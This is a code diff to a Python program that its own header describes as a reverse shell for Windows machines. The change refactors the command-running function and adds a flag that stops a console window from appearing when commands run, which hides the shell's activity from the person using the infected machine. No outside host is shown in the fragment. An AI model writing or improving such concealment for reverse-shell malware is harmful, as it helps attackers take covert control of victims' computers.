@@ -5,6 +5,7 @@ This is a reverse shell written in Python for WINDOWS machine.
 # 1st party imports
 import time
 import subprocess
+import sys
 from typing import List
 
 # local imports
@@ -31,14 +32,20 @@ def run_command(args: List[str], timeout: int = 15) -> str:
         str: The output of the command.
     """
 
-    # run the command
-    proc = subprocess.Popen(
-        args,
+    # build common Popen kwargs
+    popen_kwargs = dict(
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
-        text=True,
+        universal_newlines=True,
         bufsize=1,
     )
+
+    # On Windows prevent a new console window from flashing
+    if sys.platform == "win32":
+        popen_kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
+
+    # run the command
+    proc = subprocess.Popen(args, **popen_kwargs)
 
     # get the output
     output = []
